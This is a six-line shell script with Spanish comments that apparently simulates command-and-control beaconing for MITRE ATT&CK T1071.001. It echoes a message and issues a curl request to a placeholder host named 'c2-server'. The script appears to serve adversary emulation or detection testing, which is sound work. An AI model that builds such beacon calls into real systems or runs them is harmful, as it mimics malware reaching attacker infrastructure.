#!/bin/sh
# Simulación de Command and Control
# MITRE ATT&CK: T1071.001 – Web Protocols

echo "[C2] Enviando beacon HTTP al servidor C2"
curl http://c2-server/
